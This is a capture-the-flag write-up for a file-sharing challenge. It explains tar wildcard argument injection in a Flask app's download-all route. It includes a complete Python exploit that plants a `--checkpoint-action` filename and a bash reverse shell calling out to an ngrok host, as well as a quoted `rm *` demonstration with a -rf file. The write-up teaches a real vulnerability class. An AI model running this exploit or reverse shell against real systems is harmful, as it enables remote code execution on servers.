# Enterprice File Sharing

## Description

> For security reasons we only use enterprice grade cloud storage.

{% file src="../../.gitbook/assets/EFS.tar.gz" %}

## Solution

### Code Review

This, for the most part, seems like a standard file hosting site. Let's take a look at the validation.

First, uploaded files must have one of the allowed extensions.

```python
# We only allow files for serious business use-cases
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'}


def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

We also see that steps have been taken to normalize the file paths, to prevent directory traversal attacks using `../`.

```python
def normalize_file(filename):
    return filename.replace("..", "_")

...

@app.route('/upload', methods=["POST"])
def upload():
    if "ID" not in session:
        return redirect("/")

    if 'file' not in request.files:
        flash('No file part')
        return redirect("/")
    file = request.files['file']

    if file.filename == '':
        flash('No file selected')
        return redirect(request.url)

    if file and allowed_file(file.filename):
        f_content = file.stream.read()
        if len(f_content) > 1024:
            flash("Your file is too big! Buy premium to upload bigger files!")
            return redirect('/')
        filename = normalize_file(file.filename)
        with open(os.path.join(SESS_BASE_DIR, session["ID"], filename), "wb") as f:
            f.write(f_content)
            print(os.path.join(SESS_BASE_DIR, session["ID"], filename))
        return redirect("/")
    else:
        flash("Invalid file type submitted!")
        return redirect('/')

    return redirect("/")
```

What seems out of the ordinary, though, is the use of `os.system()` to execute a `tar` command when the user requests to download all uploaded files. Surely there's a library for that!

```python
@app.route('/download_all')
def download_all():
    if "ID" not in session:
        return redirect("/")

    sess_id = session["ID"]
    sess_dir = os.path.join(SESS_BASE_DIR, sess_id)

    res = os.system(f"cd {sess_dir} && tar czf /tmp/{sess_id}.tgz *")
    if res != 0:
        flash("Something went wrong.")
        return redirect("/")
    return send_file(f"/tmp/{sess_id}.tgz", attachment_filename=f"{sess_id}.tgz")
```

### Wildcard Injection

I decided to pay closer attention to the system command: `cd {sess_dir} && tar czf /tmp/{sess_id}.tgz *`.

A bit of research led me to a few very interesting papers, one of which was [this](https://www.exploit-db.com/papers/33930). Apparently, this is a class of Unix vulnerabilities where wildcards in commands can be abused to inject arguments!

For instance, if you have a file named `-rf`, and you execute `rm *`, the wildcard gets substituted with `-rf`, which is interpreted as a command line argument!

```
[root@defensecode public]# ls -al
total 20
drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file1.txt
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file2.txt
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file3.txt
-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
[root@defensecode public]# rm *
[root@defensecode public]# ls -al
total 8
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
```

Now, how can we abuse this in our use case? In `tar`, there is a `--checkpoint-action` option that will specify which program will be executed when a "checkpoint" is reached.

A common payload to exploit this would be two files:

* `--checkpoint-action=exec=sh shell.sh`
* `--checkpoint=1`

Now, the first file and the script are no problem - we can use `--checkpoint-action=exec=sh shell.txt` to perform argument pollution, which works because this ends with `.txt`.

We cannot use `checkpoint=1` , though, because this won’t pass the extension check.

Looking a bit more into the Tar manual, I saw that the default checkpoint number is 10, which means that the checkpoint action is performed every 10 records.

![](<../../.gitbook/assets/image (80) (1) (1).png>)

But how big is each record? Apparently, it's 20 512-byte blocks.

![](<../../.gitbook/assets/image (82) (1).png>)

So if we upload enough bytes, our tar archive will eventually exceed 10 records \* 20 blocks \* 512 bytes = 102400 bytes. Once that happens, we would have 10 records within the tar archive and the checkpoint action will be executed.

```python
import requests
import os

s = requests.session()

s.get("http://efs.rumble.host/")

with open("shell.txt", 'w') as f:
    f.write("bash -c \"bash -i >& /dev/tcp/6.tcp.ngrok.io/12843 0>&1\"")

with open("--checkpoint-action=exec=sh shell.txt", "w") as f:
    f.write("")

s.post("http://efs.rumble.host/upload",
    files = {"file": open("shell.txt", 'rb')}
)

s.post("http://efs.rumble.host/upload",
    files = {"file": open("--checkpoint-action=exec=sh shell.txt", 'rb')}
)

# Default record size for tar = 512 bytes * 20 = 10240 bytes
# Default checkpoint is 10 records
curr_bytes = 0
filename = 'a'

while curr_bytes < 10240 * 10:

    with open(filename + ".txt", 'wb') as f:
        f.write(os.urandom(1024))

    r = s.post("http://efs.rumble.host/upload",
        files = {"file": open(filename + ".txt", 'rb')}
    )

    print("Uploaded", filename + ".txt")
    filename += 'a'
    
    os.system("tar czf test.tgz a*.txt")
    with open("test.tgz", 'rb') as f:
        curr_bytes = len(f.read())
        print(f"Currently at {curr_bytes} bytes")

s.get("http://efs.rumble.host/download_all")
print(s.cookies.get_dict())
```

Once we request `/download_all` and the `tar` command is run, we get a shell.

```
gunicorn@8d66a32a984a:/$ cat flag.txt
cat flag.txt
CSR{shellscanbeannoying_greetsfromabudhabikek}
gunicorn@8d66a32a984a:/$
```
